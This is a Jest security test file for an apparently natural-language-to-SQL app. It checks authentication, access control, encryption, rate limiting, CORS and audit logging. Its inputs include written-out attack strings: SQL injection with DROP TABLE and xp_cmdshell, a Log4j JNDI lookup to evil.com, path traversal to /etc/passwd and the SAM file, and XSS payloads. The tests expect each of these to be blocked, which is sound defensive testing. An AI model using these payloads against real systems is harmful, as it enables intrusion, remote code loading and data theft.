/**
 * LALO MVP Security Tests
 * Comprehensive security validation including access control, injection prevention, and data protection
 */

import { SecurityTester, VulnerabilityScanner, AccessControlValidator } from '../../src/security';

describe('LALO MVP Security Tests', () => {
  let securityTester: SecurityTester;
  let vulnScanner: VulnerabilityScanner;
  let accessValidator: AccessControlValidator;

  beforeEach(() => {
    securityTester = new SecurityTester({
      baseUrl: process.env.TEST_BASE_URL || 'http://localhost:3000',
      strictMode: true
    });

    vulnScanner = new VulnerabilityScanner({
      scanDepth: 'comprehensive',
      includeZeroDay: true
    });

    accessValidator = new AccessControlValidator({
      enforceStrict: true,
      auditAllAttempts: true
    });
  });

  describe('Authentication Security', () => {
    test('should prevent brute force attacks', async () => {
      const attempts = [];
      const invalidCredentials = {
        email: 'test@example.com',
        password: 'wrongpassword'
      };

      // Attempt multiple failed logins
      for (let i = 0; i < 10; i++) {
        const response = await securityTester.attemptLogin(invalidCredentials);
        attempts.push(response);
      }

      // Should implement rate limiting
      const recentAttempts = attempts.slice(-5);
      const rateLimited = recentAttempts.some(attempt =>
        attempt.status === 429 || attempt.headers['retry-after']
      );

      expect(rateLimited).toBe(true);

      // Account should be temporarily locked
      const lockoutStatus = await securityTester.checkAccountLockout(invalidCredentials.email);
      expect(lockoutStatus.locked).toBe(true);
      expect(lockoutStatus.lockoutDuration).toBeGreaterThan(0);
    });

    test('should enforce strong password policies', async () => {
      const weakPasswords = [
        '123456',
        'password',
        'qwerty',
        'abc123',
        '111111',
        'Password', // Missing special chars and numbers
        '12345678', // No letters
        'ABCDEFGH', // No lowercase or numbers
        'abcdefgh'  // No uppercase or numbers
      ];

      for (const password of weakPasswords) {
        const validation = await securityTester.validatePassword(password);
        expect(validation.valid).toBe(false);
        expect(validation.strength).toBeLessThan(3); // Scale of 1-5
        expect(validation.errors).toContain('password_too_weak');
      }

      // Test strong password acceptance
      const strongPassword = 'MyStr0ng!P@ssw0rd#2023';
      const strongValidation = await securityTester.validatePassword(strongPassword);
      expect(strongValidation.valid).toBe(true);
      expect(strongValidation.strength).toBeGreaterThanOrEqual(4);
    });

    test('should implement secure session management', async () => {
      const user = global.testUtils.createMockUser();
      const loginResult = await securityTester.performLogin(user);

      // Check session token properties
      expect(loginResult.token).toBeDefined();
      expect(loginResult.token.length).toBeGreaterThan(32); // Sufficient entropy
      expect(loginResult.token).toMatch(/^[A-Za-z0-9+/=]+$/); // Base64 format

      // Check session expiration
      const sessionInfo = await securityTester.getSessionInfo(loginResult.token);
      expect(sessionInfo.expiresAt).toBeDefined();
      expect(new Date(sessionInfo.expiresAt)).toBeInstanceOf(Date);

      // Check secure cookie flags
      const cookies = loginResult.cookies;
      const sessionCookie = cookies.find(c => c.name === 'session');

      expect(sessionCookie.httpOnly).toBe(true);
      expect(sessionCookie.secure).toBe(true);
      expect(sessionCookie.sameSite).toBe('strict');
    });

    test('should handle session hijacking attempts', async () => {
      const user = global.testUtils.createMockUser();
      const loginResult = await securityTester.performLogin(user);

      // Simulate session hijacking by modifying token
      const hijackedToken = loginResult.token.slice(0, -4) + 'HACK';

      const hijackAttempt = await securityTester.makeAuthenticatedRequest('/api/user/profile', {
        token: hijackedToken
      });

      expect(hijackAttempt.status).toBe(401);
      expect(hijackAttempt.data.error).toContain('invalid_token');

      // Check that security event was logged
      const securityLogs = await securityTester.getSecurityLogs();
      const hijackLog = securityLogs.find(log => log.type === 'token_tampering');
      expect(hijackLog).toBeDefined();
      expect(hijackLog.severity).toBe('high');
    });
  });

  describe('SQL Injection Prevention', () => {
    test('should prevent SQL injection in NL2SQL queries', async () => {
      const maliciousQueries = [
        "Show users'; DROP TABLE users; --",
        "List data WHERE 1=1 UNION SELECT password FROM users",
        "Display info'; INSERT INTO users (name) VALUES ('hacker'); --",
        "Show records' OR '1'='1",
        "Get data\"; DELETE FROM sensitive_data; --",
        "Find users'; EXEC xp_cmdshell('dir'); --"
      ];

      for (const maliciousQuery of maliciousQueries) {
        const result = await securityTester.submitNLQuery(maliciousQuery);

        // Should detect and block SQL injection
        expect(result.blocked).toBe(true);
        expect(result.reason).toContain('sql_injection_detected');
        expect(result.threat_level).toBe('high');

        // Verify no SQL was executed
        expect(result.sql_executed).toBe(false);

        // Check security alert was raised
        const alerts = await securityTester.getSecurityAlerts();
        const injectionAlert = alerts.find(alert =>
          alert.type === 'sql_injection_attempt' &&
          alert.query === maliciousQuery
        );
        expect(injectionAlert).toBeDefined();
      }
    });

    test('should sanitize user inputs properly', async () => {
      const inputsToTest = [
        { input: "<script>alert('xss')</script>", type: 'xss' },
        { input: "'; DROP TABLE users; --", type: 'sql_injection' },
        { input: "../../../etc/passwd", type: 'path_traversal' },
        { input: "${jndi:ldap://evil.com/}", type: 'log4j_injection' },
        { input: "{{7*7}}", type: 'template_injection' }
      ];

      for (const testCase of inputsToTest) {
        const sanitized = await securityTester.sanitizeInput(testCase.input);

        expect(sanitized.safe).toBe(true);
        expect(sanitized.sanitizedInput).not.toEqual(testCase.input);
        expect(sanitized.threatsRemoved).toContain(testCase.type);

        // Verify sanitized input is safe to use
        const validation = await securityTester.validateSanitizedInput(sanitized.sanitizedInput);
        expect(validation.containsThreats).toBe(false);
      }
    });

    test('should use parameterized queries', async () => {
      const naturalQuery = "Show users with name containing 'John'";
      const result = await securityTester.analyzeGeneratedSQL(naturalQuery);

      // Verify SQL uses parameters instead of string concatenation
      expect(result.sql).toContain('$1'); // PostgreSQL parameter
      expect(result.parameters).toBeDefined();
      expect(result.parameters).toContain('John');

      // Ensure no direct string interpolation
      expect(result.sql).not.toContain("'John'");
      expect(result.usesParameterization).toBe(true);
    });
  });

  describe('Access Control and Authorization', () => {
    test('should enforce role-based access control', async () => {
      const testScenarios = [
        {
          user: { role: 'viewer', permissions: ['read:basic'] },
          resource: 'sensitive_data',
          action: 'read',
          expected: false
        },
        {
          user: { role: 'analyst', permissions: ['read:data'] },
          resource: 'user_data',
          action: 'read',
          expected: true
        },
        {
          user: { role: 'admin', permissions: ['*'] },
          resource: 'admin_panel',
          action: 'write',
          expected: true
        },
        {
          user: { role: 'user', permissions: ['read:own_data'] },
          resource: 'other_user_data',
          action: 'read',
          expected: false
        }
      ];

      for (const scenario of testScenarios) {
        const accessResult = await accessValidator.checkAccess({
          user: scenario.user,
          resource: scenario.resource,
          action: scenario.action
        });

        expect(accessResult.allowed).toBe(scenario.expected);

        if (!scenario.expected) {
          expect(accessResult.reason).toContain('insufficient_permissions');
          expect(accessResult.requiredPermissions).toBeDefined();
        }
      }
    });

    test('should prevent privilege escalation', async () => {
      const lowPrivUser = global.testUtils.createMockUser({ role: 'user' });

      // Attempt to modify own role
      const escalationAttempt1 = await securityTester.makeAuthenticatedRequest('/api/user/update-role', {
        method: 'POST',
        user: lowPrivUser,
        data: { role: 'admin' }
      });

      expect(escalationAttempt1.status).toBe(403);
      expect(escalationAttempt1.data.error).toContain('privilege_escalation_blocked');

      // Attempt to access admin endpoints
      const escalationAttempt2 = await securityTester.makeAuthenticatedRequest('/api/admin/users', {
        user: lowPrivUser
      });

      expect(escalationAttempt2.status).toBe(403);

      // Verify security alerts were generated
      const alerts = await securityTester.getSecurityAlerts();
      const escalationAlerts = alerts.filter(alert => alert.type === 'privilege_escalation_attempt');
      expect(escalationAlerts.length).toBeGreaterThan(0);
    });

    test('should implement attribute-based access control', async () => {
      const testCases = [
        {
          user: { department: 'sales', level: 3 },
          resource: { type: 'sales_data', department: 'sales' },
          context: { time: '09:00', location: 'office' },
          expected: true
        },
        {
          user: { department: 'hr', level: 2 },
          resource: { type: 'sales_data', department: 'sales' },
          context: { time: '14:00', location: 'office' },
          expected: false // Different department
        },
        {
          user: { department: 'sales', level: 3 },
          resource: { type: 'sales_data', department: 'sales' },
          context: { time: '02:00', location: 'remote' },
          expected: false // Outside business hours, remote access
        }
      ];

      for (const testCase of testCases) {
        const result = await accessValidator.evaluateAttributeBasedAccess({
          user: testCase.user,
          resource: testCase.resource,
          context: testCase.context
        });

        expect(result.allowed).toBe(testCase.expected);

        if (!testCase.expected) {
          expect(result.failedConditions).toBeDefined();
          expect(result.failedConditions.length).toBeGreaterThan(0);
        }
      }
    });
  });

  describe('Data Protection and Privacy', () => {
    test('should encrypt sensitive data at rest', async () => {
      const sensitiveData = {
        ssn: '123-45-6789',
        creditCard: '4111-1111-1111-1111',
        password: 'userPassword123!'
      };

      // Store data and verify encryption
      const stored = await securityTester.storeData(sensitiveData);

      expect(stored.encrypted).toBe(true);
      expect(stored.data.ssn).not.toEqual(sensitiveData.ssn);
      expect(stored.data.creditCard).not.toEqual(sensitiveData.creditCard);
      expect(stored.data.password).not.toEqual(sensitiveData.password);

      // Verify encryption algorithm and key management
      expect(stored.encryptionAlgorithm).toBe('AES-256-GCM');
      expect(stored.keyId).toBeDefined();
      expect(stored.keyId).not.toContain(stored.encryptionKey); // Key not exposed

      // Verify data can be decrypted by authorized processes
      const decrypted = await securityTester.retrieveData(stored.id);
      expect(decrypted.ssn).toEqual(sensitiveData.ssn);
      expect(decrypted.creditCard).toEqual(sensitiveData.creditCard);
    });

    test('should implement data masking for unauthorized access', async () => {
      const userData = {
        id: 'user-123',
        name: 'John Doe',
        email: 'john.doe@company.com',
        ssn: '123-45-6789',
        salary: 75000
      };

      // Access with low privileges
      const viewerAccess = await securityTester.accessDataAsRole(userData.id, 'viewer');

      expect(viewerAccess.name).toEqual('John Doe'); // Public info
      expect(viewerAccess.email).toMatch(/j\*\*\*@\*\*\*\.com/); // Masked email
      expect(viewerAccess.ssn).toMatch(/\*\*\*-\*\*-\d{4}/); // Masked SSN
      expect(viewerAccess.salary).toBeUndefined(); // Completely hidden

      // Access with appropriate privileges
      const analystAccess = await securityTester.accessDataAsRole(userData.id, 'analyst');

      expect(analystAccess.email).toEqual('john.doe@company.com'); // Unmasked
      expect(analystAccess.salary).toEqual(75000); // Visible
      expect(analystAccess.ssn).toMatch(/\*\*\*-\*\*-\d{4}/); // Still masked (requires higher privilege)
    });

    test('should implement data retention policies', async () => {
      const testData = {
        id: 'test-data-123',
        content: 'Sensitive business data',
        classification: 'confidential',
        retentionPeriod: '90 days'
      };

      await securityTester.storeDataWithRetention(testData);

      // Simulate time passage
      await securityTester.simulateTimePassage('91 days');

      // Verify data is automatically purged
      const retrieveResult = await securityTester.retrieveData(testData.id);
      expect(retrieveResult).toBeNull();

      // Check audit trail for deletion
      const auditLogs = await securityTester.getDataAuditLogs();
      const deletionLog = auditLogs.find(log =>
        log.dataId === testData.id && log.action === 'auto_deleted'
      );
      expect(deletionLog).toBeDefined();
      expect(deletionLog.reason).toBe('retention_period_expired');
    });
  });

  describe('Input Validation and Sanitization', () => {
    test('should validate all input parameters', async () => {
      const maliciousInputs = [
        { field: 'query', value: null, expected: 'required_field_missing' },
        { field: 'query', value: '', expected: 'empty_value' },
        { field: 'query', value: 'a'.repeat(10000), expected: 'value_too_long' },
        { field: 'userId', value: '../admin', expected: 'invalid_format' },
        { field: 'email', value: 'not-an-email', expected: 'invalid_email_format' },
        { field: 'limit', value: -1, expected: 'invalid_range' },
        { field: 'limit', value: 999999, expected: 'exceeds_maximum' }
      ];

      for (const input of maliciousInputs) {
        const validation = await securityTester.validateInput(input.field, input.value);

        expect(validation.valid).toBe(false);
        expect(validation.errors).toContain(input.expected);
      }
    });

    test('should prevent path traversal attacks', async () => {
      const pathTraversalAttempts = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd'
      ];

      for (const maliciousPath of pathTraversalAttempts) {
        const result = await securityTester.attemptFileAccess(maliciousPath);

        expect(result.blocked).toBe(true);
        expect(result.reason).toContain('path_traversal_detected');
        expect(result.fileAccessed).toBe(false);

        // Verify security alert
        const alerts = await securityTester.getSecurityAlerts();
        const pathTraversalAlert = alerts.find(alert =>
          alert.type === 'path_traversal_attempt' &&
          alert.path === maliciousPath
        );
        expect(pathTraversalAlert).toBeDefined();
      }
    });

    test('should sanitize output to prevent XSS', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(1)">',
        'javascript:alert("XSS")',
        '<svg onload="alert(1)">',
        '"><script>alert("XSS")</script>',
        '\'>alert("XSS")</script>'
      ];

      for (const payload of xssPayloads) {
        const result = await securityTester.processUserInput(payload);

        expect(result.output).not.toContain('<script>');
        expect(result.output).not.toContain('javascript:');
        expect(result.output).not.toContain('onload=');
        expect(result.output).not.toContain('onerror=');

        // Should escape or remove dangerous content
        expect(result.sanitized).toBe(true);
        expect(result.threatsRemoved).toContain('xss');
      }
    });
  });

  describe('API Security', () => {
    test('should implement rate limiting', async () => {
      const user = global.testUtils.createMockUser();
      const endpoint = '/api/query';
      const rateLimit = 10; // requests per minute

      const requests = [];

      // Make requests exceeding rate limit
      for (let i = 0; i < rateLimit + 5; i++) {
        const request = securityTester.makeAuthenticatedRequest(endpoint, {
          user,
          data: { query: `Test query ${i}` }
        });
        requests.push(request);
      }

      const responses = await Promise.all(requests);

      // Check that some requests were rate limited
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);

      // Check rate limit headers
      const lastResponse = responses[responses.length - 1];
      expect(lastResponse.headers['x-ratelimit-remaining']).toBeDefined();
      expect(lastResponse.headers['retry-after']).toBeDefined();
    });

    test('should validate API tokens properly', async () => {
      const validToken = await securityTester.generateValidToken();
      const invalidTokens = [
        'invalid-token',
        '',
        null,
        'Bearer invalid',
        validToken.substring(0, -5) + 'xxxxx', // Modified token
        'expired-token-' + Date.now()
      ];

      // Valid token should work
      const validRequest = await securityTester.makeAuthenticatedRequest('/api/user/profile', {
        token: validToken
      });
      expect(validRequest.status).toBe(200);

      // Invalid tokens should be rejected
      for (const invalidToken of invalidTokens) {
        const invalidRequest = await securityTester.makeAuthenticatedRequest('/api/user/profile', {
          token: invalidToken
        });
        expect(invalidRequest.status).toBe(401);
      }
    });

    test('should implement CORS properly', async () => {
      const corsTests = [
        {
          origin: 'https://trusted-domain.com',
          expected: true
        },
        {
          origin: 'https://malicious-site.com',
          expected: false
        },
        {
          origin: 'http://localhost:3000',
          expected: true // Development
        },
        {
          origin: null,
          expected: false // Null origin
        }
      ];

      for (const test of corsTests) {
        const response = await securityTester.makeRequestWithOrigin('/api/health', test.origin);

        if (test.expected) {
          expect(response.headers['access-control-allow-origin']).toBeDefined();
        } else {
          expect(response.status).toBe(403);
          expect(response.headers['access-control-allow-origin']).toBeUndefined();
        }
      }
    });
  });

  describe('Security Monitoring and Alerting', () => {
    test('should detect and alert on suspicious patterns', async () => {
      // Simulate suspicious activity patterns
      const suspiciousActivities = [
        { type: 'multiple_failed_logins', count: 10, timeWindow: '5 minutes' },
        { type: 'unusual_query_patterns', count: 50, timeWindow: '1 minute' },
        { type: 'privilege_escalation_attempts', count: 3, timeWindow: '10 minutes' },
        { type: 'data_exfiltration_pattern', count: 1000, timeWindow: '1 hour' }
      ];

      for (const activity of suspiciousActivities) {
        await securityTester.simulateSuspiciousActivity(activity);

        // Check that alerts were generated
        const alerts = await securityTester.getSecurityAlerts();
        const relevantAlert = alerts.find(alert => alert.pattern === activity.type);

        expect(relevantAlert).toBeDefined();
        expect(relevantAlert.severity).toBeOneOf(['medium', 'high', 'critical']);
        expect(relevantAlert.actionRequired).toBe(true);
      }
    });

    test('should implement security event correlation', async () => {
      const user = global.testUtils.createMockUser();

      // Generate correlated suspicious events
      await securityTester.simulateUserActivity(user.id, [
        { action: 'failed_login', timestamp: Date.now() },
        { action: 'password_reset_request', timestamp: Date.now() + 1000 },
        { action: 'login_from_new_location', timestamp: Date.now() + 2000 },
        { action: 'bulk_data_access', timestamp: Date.now() + 3000 }
      ]);

      // Check for correlated security alert
      const correlatedAlerts = await securityTester.getCorrelatedAlerts(user.id);

      expect(correlatedAlerts.length).toBeGreaterThan(0);

      const accountCompromiseAlert = correlatedAlerts.find(alert =>
        alert.type === 'potential_account_compromise'
      );

      expect(accountCompromiseAlert).toBeDefined();
      expect(accountCompromiseAlert.confidence).toBeGreaterThan(0.8);
      expect(accountCompromiseAlert.recommendedActions).toContain('force_password_reset');
    });

    test('should maintain detailed security audit logs', async () => {
      const user = global.testUtils.createMockUser();

      // Perform various actions
      await securityTester.makeAuthenticatedRequest('/api/login', { user });
      await securityTester.makeAuthenticatedRequest('/api/query', {
        user,
        data: { query: 'Show sensitive data' }
      });
      await securityTester.makeAuthenticatedRequest('/api/logout', { user });

      // Check audit logs
      const auditLogs = await securityTester.getAuditLogs(user.id);

      expect(auditLogs.length).toBeGreaterThanOrEqual(3);

      // Verify log completeness
      const loginLog = auditLogs.find(log => log.action === 'login');
      expect(loginLog).toBeDefined();
      expect(loginLog.userId).toBe(user.id);
      expect(loginLog.ipAddress).toBeDefined();
      expect(loginLog.userAgent).toBeDefined();
      expect(loginLog.timestamp).toBeInstanceOf(Date);

      const queryLog = auditLogs.find(log => log.action === 'query_execution');
      expect(queryLog).toBeDefined();
      expect(queryLog.resource).toBe('sensitive data');
      expect(queryLog.accessGranted).toBeDefined();
    });
  });

  describe('Compliance and Regulatory Requirements', () => {
    test('should implement GDPR compliance features', async () => {
      const user = global.testUtils.createMockUser();

      // Test right to access
      const personalData = await securityTester.requestPersonalData(user.id);
      expect(personalData).toBeDefined();
      expect(personalData.userId).toBe(user.id);
      expect(personalData.dataCategories).toContain('profile');
      expect(personalData.dataCategories).toContain('usage_logs');

      // Test right to portability
      const exportData = await securityTester.exportUserData(user.id, 'json');
      expect(exportData.format).toBe('json');
      expect(exportData.data).toBeDefined();
      expect(exportData.exported_at).toBeInstanceOf(Date);

      // Test right to be forgotten
      const deletionResult = await securityTester.deleteUserData(user.id);
      expect(deletionResult.deleted).toBe(true);
      expect(deletionResult.retainedData).toBeDefined(); // Legal requirements
      expect(deletionResult.retentionReason).toBeDefined();

      // Verify data is actually deleted
      const retrieveAttempt = await securityTester.retrieveUserData(user.id);
      expect(retrieveAttempt.found).toBe(false);
    });

    test('should implement SOC 2 compliance controls', async () => {
      // Security controls
      const securityControls = await securityTester.validateSecurityControls();
      expect(securityControls.encryption_at_rest).toBe(true);
      expect(securityControls.encryption_in_transit).toBe(true);
      expect(securityControls.access_controls).toBe(true);
      expect(securityControls.vulnerability_management).toBe(true);

      // Availability controls
      const availabilityControls = await securityTester.validateAvailabilityControls();
      expect(availabilityControls.backup_procedures).toBe(true);
      expect(availabilityControls.disaster_recovery).toBe(true);
      expect(availabilityControls.capacity_monitoring).toBe(true);

      // Processing integrity controls
      const integrityControls = await securityTester.validateProcessingIntegrityControls();
      expect(integrityControls.data_validation).toBe(true);
      expect(integrityControls.error_handling).toBe(true);
      expect(integrityControls.change_management).toBe(true);

      // Confidentiality controls
      const confidentialityControls = await securityTester.validateConfidentialityControls();
      expect(confidentialityControls.data_classification).toBe(true);
      expect(confidentialityControls.access_restrictions).toBe(true);
      expect(confidentialityControls.secure_disposal).toBe(true);

      // Privacy controls
      const privacyControls = await securityTester.validatePrivacyControls();
      expect(privacyControls.notice_procedures).toBe(true);
      expect(privacyControls.choice_consent).toBe(true);
      expect(privacyControls.data_quality).toBe(true);
    });
  });

  describe('Hive Mind Security Coordination', () => {
    test('should share security threat intelligence', async () => {
      const threatIndicator = {
        type: 'malicious_ip',
        value: '192.168.1.100',
        confidence: 0.9,
        source: 'node-1'
      };

      await securityTester.shareThreatIntelligence(threatIndicator);

      // Verify threat is shared across hive
      const hiveThreatData = await securityTester.getHiveThreatIntelligence();
      const sharedThreat = hiveThreatData.find(threat =>
        threat.value === threatIndicator.value
      );

      expect(sharedThreat).toBeDefined();
      expect(sharedThreat.nodes_reporting).toBeGreaterThan(0);
      expect(sharedThreat.first_seen).toBeInstanceOf(Date);
    });

    test('should coordinate security responses across nodes', async () => {
      const securityIncident = {
        type: 'brute_force_attack',
        source_ip: '10.0.0.1',
        target_user: 'admin@example.com',
        severity: 'high'
      };

      await securityTester.reportSecurityIncident(securityIncident);

      // Check coordinated response
      const coordinatedResponse = await securityTester.getCoordinatedSecurityResponse(securityIncident.type);

      expect(coordinatedResponse.action_taken).toBe('ip_blocked');
      expect(coordinatedResponse.nodes_affected).toBeGreaterThan(1);
      expect(coordinatedResponse.response_time).toBeLessThan(5000); // 5 seconds

      // Verify blocking is effective across hive
      const blockStatus = await securityTester.checkIPBlockStatus(securityIncident.source_ip);
      expect(blockStatus.blocked).toBe(true);
      expect(blockStatus.block_duration).toBeGreaterThan(0);
    });

    test('should learn from collective security patterns', async () => {
      const securityPatterns = [
        { pattern: 'off_hours_admin_access', threat_level: 0.7 },
        { pattern: 'bulk_data_export', threat_level: 0.8 },
        { pattern: 'rapid_permission_changes', threat_level: 0.9 }
      ];

      for (const pattern of securityPatterns) {
        await securityTester.recordSecurityPattern(pattern);
      }

      // Test pattern recognition
      const suspiciousActivity = {
        user: 'admin@example.com',
        action: 'bulk_data_export',
        time: '03:00', // Off hours
        data_volume: '10GB'
      };

      const threatAssessment = await securityTester.assessThreatLevel(suspiciousActivity);

      expect(threatAssessment.threat_level).toBeGreaterThan(0.8);
      expect(threatAssessment.patterns_matched).toContain('off_hours_admin_access');
      expect(threatAssessment.patterns_matched).toContain('bulk_data_export');
      expect(threatAssessment.recommended_action).toBe('immediate_review');
    });
  });
});